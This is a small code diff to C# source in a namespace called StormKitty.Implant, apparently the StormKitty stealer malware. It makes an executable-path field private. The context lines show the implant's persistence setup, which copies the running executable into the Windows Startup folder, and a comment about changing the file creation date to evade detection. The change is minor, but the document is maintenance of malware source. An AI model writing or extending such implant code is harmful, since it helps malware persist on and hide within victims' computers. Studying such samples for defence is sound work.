@@ -7,7 +7,7 @@ namespace StormKitty.Implant
     {
         // Autorun path
         private static readonly string StartupDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
-        public static readonly string ExecutablePath = System.Reflection.Assembly.GetEntryAssembly().Location;
+        private static readonly string ExecutablePath = System.Reflection.Assembly.GetEntryAssembly().Location;
         private static readonly string CopyExecutableTo = $"{StartupDirectory}\\{Path.GetFileName(ExecutablePath)}";
 
         // Change file creation date
